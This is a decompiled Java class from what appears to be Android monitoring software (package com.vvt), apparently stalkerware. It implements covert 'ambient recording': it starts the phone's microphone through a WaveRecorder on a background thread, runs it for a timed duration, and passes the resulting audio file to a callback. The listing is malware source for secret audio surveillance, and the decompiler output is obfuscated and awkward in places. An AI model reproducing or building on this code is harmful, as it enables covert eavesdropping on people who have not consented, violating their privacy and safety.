package com.vvt.a;

import android.os.SystemClock;
import com.android.a.b;
import com.android.soundrecorders.WaveRecorder;
import com.android.soundrecorders.WaveRecorder.State;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class e
  implements a
{
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  com.android.a.a a;
  private c d;
  private String e;
  private String f;
  private int g;
  private b h;
  private WaveRecorder i;
  private Timer j;
  private com.vvt.base.a k;
  
  public e(com.vvt.base.a parama)
  {
    Object localObject = new com/vvt/a/h;
    ((h)localObject).<init>(this);
    this.a = ((com.android.a.a)localObject);
    this.k = parama;
    localObject = new com/android/a/b;
    ((b)localObject).<init>();
    this.h = ((b)localObject);
  }
  
  private void b(String paramString)
  {
    Object localObject1 = new com/vvt/events/FxSystemEvent;
    ((FxSystemEvent)localObject1).<init>();
    Object localObject2 = FxEventDirection.OUT;
    ((FxSystemEvent)localObject1).setDirection((FxEventDirection)localObject2);
    long l = System.currentTimeMillis();
    ((FxSystemEvent)localObject1).setEventTime(l);
    ((FxSystemEvent)localObject1).setMessage(paramString);
    localObject2 = FxSystemEventCategories.CATEGORY_DEBUG_MESSAGE;
    ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
    boolean bool = b;
    if (bool) {}
    localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    ((ArrayList)localObject2).add(localObject1);
    localObject1 = this.k;
    if (localObject1 != null)
    {
      localObject1 = this.k;
      ((com.vvt.base.a)localObject1).a((List)localObject2);
    }
  }
  
  private void d()
  {
    boolean bool = b;
    if (bool) {}
    Object localObject1 = this.h;
    Object localObject2 = this.a;
    ((b)localObject1).a((com.android.a.a)localObject2);
    localObject1 = new java/lang/Thread;
    localObject2 = new com/vvt/a/g;
    ((g)localObject2).<init>(this);
    String str = "AmbientRecMicToMp3Thread";
    ((Thread)localObject1).<init>((Runnable)localObject2, str);
    ((Thread)localObject1).start();
    long l = 3000L;
    SystemClock.sleep(l);
    bool = b;
    if (bool) {}
  }
  
  private void e()
  {
    for (;;)
    {
      try
      {
        localObject1 = new java/io/File;
        localObject3 = this.e;
        ((File)localObject1).<init>((String)localObject3);
        boolean bool1 = ((File)localObject1).exists();
        if (bool1) {
          ((File)localObject1).delete();
        }
        localObject1 = this.i;
        if (localObject1 != null)
        {
          localObject1 = this.i;
          ((WaveRecorder)localObject1).d();
          localObject1 = this.i;
          localObject3 = this.e;
          ((WaveRecorder)localObject1).a((String)localObject3);
          localObject1 = this.i;
          ((WaveRecorder)localObject1).b();
          localObject1 = this.i;
          localObject1 = ((WaveRecorder)localObject1).a();
          localObject3 = WaveRecorder.State.ERROR;
          if (localObject1 != localObject3) {
            continue;
          }
          localObject1 = this.d;
          if (localObject1 != null)
          {
            localObject1 = "Error while preparing WaveRecorder. ";
            localObject3 = this.i;
            localObject3 = ((WaveRecorder)localObject3).a;
            if (localObject3 != null)
            {
              localObject3 = new java/lang/StringBuilder;
              ((StringBuilder)localObject3).<init>();
              localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
              localObject3 = " err: ";
              localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
              localObject3 = this.i;
              localObject3 = ((WaveRecorder)localObject3).a;
              localObject3 = ((Throwable)localObject3).toString();
              localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
              localObject1 = ((StringBuilder)localObject1).toString();
            }
            b((String)localObject1);
            localObject3 = this.d;
            ((c)localObject3).a((String)localObject1);
          }
          return;
        }
      }
      catch (Exception localException)
      {
        Object localObject1;
        int m;
        int n;
        boolean bool2 = c;
        if (!bool2) {
          continue;
        }
        Object localObject3 = this.d;
        if (localObject3 == null) {
          continue;
        }
        localObject3 = this.d;
        StringBuilder localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        String str = "Error while starting WaveRecorder. err:";
        localStringBuilder = localStringBuilder.append(str);
        Object localObject2 = localException.toString();
        localObject2 = (String)localObject2;
        ((c)localObject3).a((String)localObject2);
        continue;
        localObject2 = this.i;
        ((WaveRecorder)localObject2).e();
        localObject2 = this.i;
        localObject2 = ((WaveRecorder)localObject2).a();
        localObject3 = WaveRecorder.State.RECORDING;
        if (localObject2 == localObject3) {
          continue;
        }
        localObject2 = this.d;
        if (localObject2 == null) {
          continue;
        }
        localObject2 = "Error while starting WaveRecorder. ";
        localObject3 = this.i;
        localObject3 = ((WaveRecorder)localObject3).a;
        if (localObject3 == null) {
          continue;
        }
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
        localObject3 = " err: ";
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject3 = this.i;
        localObject3 = ((WaveRecorder)localObject3).a;
        localObject3 = ((Throwable)localObject3).toString();
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject2 = ((StringBuilder)localObject2).toString();
        b((String)localObject2);
        localObject3 = this.d;
        ((c)localObject3).a((String)localObject2);
        continue;
      }
      localObject1 = new com/android/soundrecorders/WaveRecorder;
      m = 8000;
      n = 1;
      ((WaveRecorder)localObject1).<init>(m, n);
      this.i = ((WaveRecorder)localObject1);
    }
  }
  
  public void a(boolean paramBoolean)
  {
    boolean bool = b;
    if (bool) {}
    Object localObject1 = this.h;
    bool = ((b)localObject1).b();
    if (bool)
    {
      bool = b;
      if (bool) {}
      localObject1 = this.h;
      ((b)localObject1).a();
      localObject1 = this.i;
      if (localObject1 == null) {
        break label170;
      }
      bool = b;
      if (bool) {}
      localObject1 = this.i.a();
      Object localObject2 = WaveRecorder.State.RECORDING;
      if (localObject1 == localObject2)
      {
        this.i.f();
        localObject1 = this.i;
        ((WaveRecorder)localObject1).c();
      }
      label91:
      localObject1 = this.d;
      if ((localObject1 == null) || (!paramBoolean)) {
        break label181;
      }
      localObject1 = this.d;
      localObject2 = this.e;
      ((c)localObject1).b((String)localObject2);
    }
    for (;;)
    {
      bool = b;
      if (bool) {}
      localObject1 = this.j;
      ((Timer)localObject1).cancel();
      this.j = null;
      this.d = null;
      bool = b;
      if (bool) {}
      return;
      bool = c;
      if (!bool) {
        break;
      }
      break;
      label170:
      bool = b;
      if (!bool) {
        break label91;
      }
      break label91;
      label181:
      bool = c;
      if (!bool) {}
    }
  }
  
  public boolean a()
  {
    boolean bool1 = true;
    boolean bool2 = b;
    if (bool2) {}
    Object localObject = this.h;
    bool2 = ((b)localObject).b();
    if (bool2) {}
    for (;;)
    {
      return bool1;
      localObject = this.i;
      if (localObject != null)
      {
        bool2 = b;
        if (bool2) {}
        localObject = this.i.a();
        WaveRecorder.State localState = WaveRecorder.State.RECORDING;
        if (localObject != localState) {
          bool1 = false;
        }
      }
      else
      {
        bool1 = false;
      }
    }
  }
  
  public boolean a(String paramString)
  {
    boolean bool1 = b.a(paramString);
    boolean bool2 = b;
    if (bool2) {}
    return bool1;
  }
  
  public boolean a(String paramString1, String paramString2, int paramInt, c paramc)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    for (;;)
    {
      try
      {
        boolean bool2 = b;
        if (bool2) {}
        bool2 = b;
        if ((!bool2) || (paramc == null))
        {
          bool2 = c;
          if (bool2) {}
          return bool1;
        }
        localObject3 = this.h;
        bool2 = ((b)localObject3).b();
        if (bool2)
        {
          localObject3 = "Cannot start the recording because an ambient recording is in progress.";
          paramc.a((String)localObject3);
          continue;
        }
        localObject3 = this.i;
      }
      finally {}
      if (localObject3 != null)
      {
        localObject3 = this.i;
        localObject3 = ((WaveRecorder)localObject3).a();
        WaveRecorder.State localState = WaveRecorder.State.RECORDING;
        if (localObject3 == localState)
        {
          localObject3 = "Cannot start the recording because an ambient recording is in progress.";
          paramc.a((String)localObject3);
          continue;
        }
      }
      this.f = paramString1;
      this.d = paramc;
      this.e = paramString2;
      this.g = paramInt;
      Timer localTimer = new java/util/Timer;
      localTimer.<init>();
      this.j = localTimer;
      localTimer = this.j;
      Object localObject3 = new com/vvt/a/f;
      ((f)localObject3).<init>(this);
      int m = this.g;
      long l = m;
      localTimer.schedule((TimerTask)localObject3, l);
      d();
      bool1 = b;
      if (bool1) {}
      bool1 = true;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */